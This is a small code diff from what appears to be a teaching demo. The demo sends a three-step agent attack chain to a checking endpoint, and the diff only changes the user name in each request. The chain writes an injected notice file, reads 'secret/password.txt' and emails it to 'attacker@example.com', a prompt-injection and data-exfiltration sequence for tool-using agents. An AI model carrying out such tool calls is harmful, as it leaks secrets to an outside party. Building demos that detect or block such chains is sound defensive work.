@@ -337,7 +337,7 @@
   async function runStep1() {
     const data = await postJson("/attack-chain/check", {
       chain_session_id: SESSION_ID,
-      user: "student",
+      user: "user",
       tool: "file.write",
       params: {
         path: "public/injected_notice.txt",
@@ -353,7 +353,7 @@
   async function runStep2() {
     const data = await postJson("/attack-chain/check", {
       chain_session_id: SESSION_ID,
-      user: "student",
+      user: "user",
       tool: "file.read",
       params: {
         path: "secret/password.txt"
@@ -368,7 +368,7 @@
   async function runStep3() {
     const data = await postJson("/attack-chain/check", {
       chain_session_id: SESSION_ID,
-      user: "student",
+      user: "user",
       tool: "email.send",
       params: {
         to: "attacker@example.com",
